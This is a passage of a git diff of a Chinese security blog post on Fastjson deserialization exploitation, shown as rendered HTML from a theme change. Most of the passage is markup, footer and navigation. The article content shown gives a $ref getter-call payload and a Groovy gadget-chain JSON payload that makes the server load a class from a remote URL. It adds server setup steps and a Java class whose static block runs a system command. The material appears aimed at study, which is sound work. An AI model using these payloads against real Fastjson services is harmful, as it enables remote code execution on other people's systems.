class="punctuation">:</span> <span class="string">&quot;$.abc.BOM&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>
 
 <blockquote>
-<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br> <span class="hljs-attr">&quot;address&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br> <span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$.abc.BOM&quot;</span><br><span class="hljs-punctuation">&#125;</span> <span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
+<div class="highlight-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"> <span class="attr">&quot;address&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line"> <span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$.abc.BOM&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span> <span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>
 
 <p>这里用了FastJSON的特性<code>&quot;$ref&quot;&quot;: &quot;$.xx.yy&quot;</code>表示调用JSON对象中xx的yy属性的getter。payload中即调用 abc(org.apache.commons.io.input.BOMInputStream的BOM属性，即调用BOMInputStream的 getBOM()方法。</p>
 </blockquote>
 <h2 id="1-2-72-lt-Fastjson-lt-x3D-1-2-80"><a href="#1-2-72-lt-Fastjson-lt-x3D-1-2-80" class="headerlink" title="1.2.72 &lt; Fastjson &lt;&#x3D; 1.2.80"></a><strong>1.2.72 &lt; Fastjson &lt;&#x3D; 1.2.80</strong></h2><p>FastJSON1.2.80与1.2.68相比，ParserConfig#checkAutoType()添加了期望类黑名单，期望类在黑名单 中则无法加载，若期望类及目标类不在黑名单中则可使用与1.2.68类似绕过方法绕过检测。</p>
 <p>依赖</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.codehaus.groovy<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>groovy<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.0.13<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.codehaus.groovy<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>groovy<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.0.13<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
 
 <p>payload</p>
-<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-number">1.</span>利用隐式类关系将 org.codehaus.groovy.control.org.codehaus.groovy.control.ProcessingUnit、 org.codehaus.groovy.control.CompilerConfiguration加入到maping中 <span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.Exception&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.codehaus.groovy.control.CompilationFailedException&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;unit&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-number">2.</span>利用链加载远程类 <span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.codehaus.groovy.control.ProcessingUnit&quot;</span><span class="hljs-punctuation">,</span><br> <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.codehaus.groovy.tools.javac.JavaStubCompilationUnit&quot;</span><span class="hljs-punctuation">,</span><br> <span class="hljs-attr">&quot;config&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.codehaus.groovy.control.CompilerConfiguration&quot;</span><span class="hljs-punctuation">,</span><br>           <span class="hljs-attr">&quot;classpath&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;url地址xxx&quot;</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
+<div class="highlight-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>利用隐式类关系将 org.codehaus.groovy.control.org.codehaus.groovy.control.ProcessingUnit、 org.codehaus.groovy.control.CompilerConfiguration加入到maping中 <span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.Exception&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.codehaus.groovy.control.CompilationFailedException&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;unit&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="number">2.</span>利用链加载远程类 <span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.codehaus.groovy.control.ProcessingUnit&quot;</span><span class="punctuation">,</span></span><br><span class="line"> <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.codehaus.groovy.tools.javac.JavaStubCompilationUnit&quot;</span><span class="punctuation">,</span></span><br><span class="line"> <span class="attr">&quot;config&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.codehaus.groovy.control.CompilerConfiguration&quot;</span><span class="punctuation">,</span></span><br><span class="line">           <span class="attr">&quot;classpath&quot;</span><span class="punctuation">:</span><span class="string">&quot;url地址xxx&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>
 
 <p>服务器配置:<br> 新建文件 META-INF&#x2F;services&#x2F;org.codehaus.groovy.transform.ASTTransformation 文件内容为MyExction<br> http根目录放置MyExction.class</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> org.codehaus.groovy.ast.ASTNode;<br><span class="hljs-keyword">import</span> org.codehaus.groovy.control.SourceUnit;<br><span class="hljs-keyword">import</span> org.codehaus.groovy.transform.ASTTransformation;<br><span class="hljs-keyword">import</span> org.codehaus.groovy.transform.GroovyASTTransformation;<br><span class="hljs-meta">@GroovyASTTransformation</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyExction</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ASTTransformation</span> &#123;<br>  <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">visit</span><span class="hljs-params">(ASTNode[] astNodes, SourceUnit sourceUnit)</span> &#123;<br>&#125;<br><span class="hljs-keyword">static</span> &#123; <span class="hljs-keyword">try</span> &#123;<br>    Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>&#125; <span class="hljs-keyword">catch</span> (IOException var1) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(var1);<br>			&#125;<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> org.codehaus.groovy.ast.ASTNode;</span><br><span class="line"><span class="keyword">import</span> org.codehaus.groovy.control.SourceUnit;</span><br><span class="line"><span class="keyword">import</span> org.codehaus.groovy.transform.ASTTransformation;</span><br><span class="line"><span class="keyword">import</span> org.codehaus.groovy.transform.GroovyASTTransformation;</span><br><span class="line"><span class="meta">@GroovyASTTransformation</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyExction</span> <span class="keyword">implements</span> <span class="title class_">ASTTransformation</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visit</span><span class="params">(ASTNode[] astNodes, SourceUnit sourceUnit)</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">static</span> &#123; <span class="keyword">try</span> &#123;</span><br><span class="line">    Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException var1) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(var1);</span><br><span class="line">			&#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
 
 
 
@@ -563,394 +841,435 @@
 
 
 
+
+
+
+        </div>
+
+        
+            <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>标题:</strong> fastjson学习</li>
+        <li><strong>作者:</strong> Sl0th</li>
+        <li><strong>创建于
+                :</strong> 2023-02-01 22:40:37</li>
+        
+            <li>
+                <strong>更新于
+                    :</strong> 2024-09-28 17:01:34
+            </li>
+        
+        <li>
+            <strong>链接:</strong> http://sl0th.top/2023/02/01/fastjson学习/
+        </li>
+        <li>
+            <strong>
+                版权声明:
+            </strong>
+            
+
+            
+                本文章采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a> 进行许可。
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/fastjson/">#fastjson</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/java/">#java</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/web/">#web</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                    <div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="prev"
+                        rel="prev"
+                        href="/2023/02/04/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"
+                        >
+                            <span class="left arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">FastJson与原生反序列化</span>
+                                <span class="post-nav-item">上一篇</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2023/01/30/Hessian%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">Hessian反序列化</span>
+                                <span class="post-nav-item">下一篇</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+            <div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+                <div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        评论
+    </div>
+    
+
+        
+            
+    <div id="waline"></div>
+    <script type="module" data-swup-reload-script>
+      import { init } from '/js/libs/waline.mjs';
+
+      function loadWaline() {
+        init({
+          el: '#waline',
+          serverURL: 'https://example.example.com',
+          lang: 'zh-CN',
+          dark: 'body[class~="dark-mode"]',
+          reaction: false,
+          requiredMeta: ['nick', 'mail'],
+          emoji: [],
+          
+          
+        });
+      }
+
+      if (typeof swup !== 'undefined') {
+        loadWaline();
+      } else {
+        window.addEventListener('DOMContentLoaded', loadWaline);
+      }
+    </script>
+
+
+
+        
+    
+</div>
+
+            </div>
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">目录</div>
+        <div class="page-title">fastjson学习</div>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#fastjson%E5%AD%A6%E4%B9%A0"><span class="nav-text">fastjson学习</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-text">序列化和反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E7%B1%BB%E5%9E%8B"><span class="nav-text">常见类型</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8"><span class="nav-text">简单使用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#public-x2F-private%E5%B1%9E%E6%80%A7%E5%8C%BA%E5%88%AB"><span class="nav-text">public&#x2F;private属性区别</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#parse%E8%BF%87%E7%A8%8B"><span class="nav-text">parse过程</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-text">漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Fastjson-lt-x3D-1-2-24"><span class="nav-text">Fastjson&lt;&#x3D;1.2.24</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE"><span class="nav-text">TemplatesImpl利用链</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#payload"><span class="nav-text">payload</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#JdbcRowSetImpl%E5%88%A9%E7%94%A8%E9%93%BE"><span class="nav-text">JdbcRowSetImpl利用链</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-2-25-lt-x3D-Fastjson-lt-x3D-1-2-41"><span class="nav-text">1.2.25&lt;&#x3D;Fastjson&lt;&#x3D;1.2.41</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-1"><span class="nav-text">利用条件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%89%88%E6%9C%AC%E5%88%86%E6%9E%90"><span class="nav-text">版本分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#payload-1"><span class="nav-text">payload</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#payload2"><span class="nav-text">payload2</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Fastjson-x3D-1-2-42"><span class="nav-text">Fastjson &#x3D; 1.2.42</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-2"><span class="nav-text">利用条件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#payload-2"><span class="nav-text">payload</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Fastjson-x3D-1-2-43"><span class="nav-text">Fastjson &#x3D; 1.2.43</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-3"><span class="nav-text">利用条件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#payload-3"><span class="nav-text">payload</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Fastjson-x3D-1-2-44"><span class="nav-text">Fastjson &#x3D; 1.2.44</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#paylaod"><span class="nav-text">paylaod</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Fastjson-x3D-1-2-47"><span class="nav-text">Fastjson &#x3D; 1.2.47</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-4"><span class="nav-text">利用条件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#payload-4"><span class="nav-text">payload</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-2-48-lt-x3D-Fastjson-lt-x3D-1-2-67%EF%BC%88%E8%A6%81%E6%9C%89%E4%BE%9D%E8%B5%96%EF%BC%89"><span class="nav-text">1.2.48 &lt;&#x3D; Fastjson &lt;&#x3D; 1.2.67（要有依赖）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#payload-5"><span class="nav-text">payload</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Fastjson-x3D-1-2-68-%E8%A6%81%E6%9C%89%E4%BE%9D%E8%B5%96"><span class="nav-text">Fastjson &#x3D; 1.2.68(要有依赖)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90"><span class="nav-text">利用链分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#payload-6"><span class="nav-text">payload</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-2-72-lt-Fastjson-lt-x3D-1-2-80"><span class="nav-text">1.2.72 &lt; Fastjson &lt;&#x3D; 1.2.80</span></a></li></ol></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
 
 
 
                 
-              </div>
-            
-            <hr/>
-            <div>
-              <div class="post-metas my-3">
-  
-    <div class="post-meta mr-3 d-flex align-items-center">
-      <i class="iconfont icon-category"></i>
-      
 
-<span class="category-chains">
-  
-  
-    
-      <span class="category-chain">
-        
-  <a href="/categories/ctf/" class="category-chain-item">ctf</a>
-  
-  
-    <span>></span>
-    
-  <a href="/categories/ctf/JavaSec/" class="category-chain-item">JavaSec</a>
-  
-  
-
-  
-
-      </span>
-    
-  
-</span>
-
-    </div>
-  
-  
-    <div class="post-meta">
-      <i class="iconfont icon-tags"></i>
-      
-        <a href="/tags/web/">#web</a>
-      
-        <a href="/tags/java/">#java</a>
-      
-        <a href="/tags/fastjson/">#fastjson</a>
-      
-    </div>
-  
-</div>
-
-
-              
-  
-
-  <div class="license-box my-3">
-    <div class="license-title">
-      <div>fastjson学习</div>
-      <div>http://sloth31.github.io/2023/02/01/fastjson学习/</div>
-    </div>
-    <div class="license-meta">
-      
-        <div class="license-meta-item">
-          <div>作者</div>
-          <div>Sl0th</div>
-        </div>
-      
-      
-        <div class="license-meta-item license-meta-date">
-          <div>发布于</div>
-          <div>2023年2月1日</div>
-        </div>
-      
-      
-      <div class="license-meta-item">
-        <div>许可协议</div>
-        <div>
-          
-            
-            
-              <a target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
-              <span class="hint--top hint--rounded" aria-label="BY - 署名">
-                <i class="iconfont icon-by"></i>
-              </span>
-              </a>
-            
-              <a target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
-              <span class="hint--top hint--rounded" aria-label="NC - 非商业性使用">
-                <i class="iconfont icon-nc"></i>
-              </span>
-              </a>
-            
-              <a target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
-              <span class="hint--top hint--rounded" aria-label="SA - 相同方式共享">
-                <i class="iconfont icon-sa"></i>
-              </span>
-              </a>
-            
-          
-        </div>
-      </div>
-    </div>
-    <div class="license-icon iconfont"></div>
-  </div>
-
-
-
-              
-                <div class="post-prevnext my-3">
-                  <article class="post-prev col-6">
-                    
-                    
-                      <a href="/2023/02/04/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="FastJson与原生反序列化">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">FastJson与原生反序列化</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
-                  </article>
-                  <article class="post-next col-6">
-                    
-                    
-                      <a href="/2023/01/30/Hessian%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="Hessian反序列化">
-                        <span class="hidden-mobile">Hessian反序列化</span>
-                        <span class="visible-mobile">下一篇</span>
-                        <i class="iconfont icon-arrowright"></i>
-                      </a>
-                    
-                  </article>
-                </div>
-              
             </div>
 
             
-          </article>
+
         </div>
-      </div>
-    </div>
 
-    <div class="side-col d-none d-lg-block col-lg-2">
-      
-  <aside class="sidebar" style="margin-left: -1rem">
-    <div id="toc">
-  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
-  <div class="toc-body" id="toc-body"></div>
-</div>
-
-
-
-  </aside>
-
-
-    </div>
-  </div>
-</div>
-
-
-
-
-
-  
-
-
-
-  
-
-
-
-  
-
-
-
-  
-
-
-
-  
-
-
-
-
-
-
-
-
-    
-
-    
-      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
-        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
-      </a>
-    
-
-    
-      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
-     aria-hidden="true">
-  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
-    <div class="modal-content">
-      <div class="modal-header text-center">
-        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
-        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
-          <span aria-hidden="true">&times;</span>
-        </button>
-      </div>
-      <div class="modal-body mx-3">
-        <div class="md-form mb-5">
-          <input type="text" id="local-search-input" class="form-control validate">
-          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2022</span>
+              -
+            
+            2024&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Sl0th</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        共撰写了 44 篇文章
+                    </span>
+                    
+                </p>
+            
         </div>
-        <div class="list-group" id="local-search-result"></div>
-      </div>
+        
+            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">访问人数</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">总访问量</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">由 <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a> 驱动</span>
+            <span class="text-sm lg:block">主题&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.7.3</a></span>
+        </div>
+        
+        
+            <div>
+                博客已运行 <span class="odometer" id="runtime_days" ></span> 天 <span class="odometer" id="runtime_hours"></span> 小时 <span class="odometer" id="runtime_minutes"></span> 分钟 <span class="odometer" id="runtime_seconds"></span> 秒
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
     </div>
-  </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="go-comment">
+                <i class="fa-regular fa-comments"></i>
+            </li>
+        
+    </ul>
 </div>
 
+        </div>
     
 
-    
-  </main>
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
 
-  <footer>
-    <div class="footer-inner">
-  
-    <div class="footer-content">
-       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
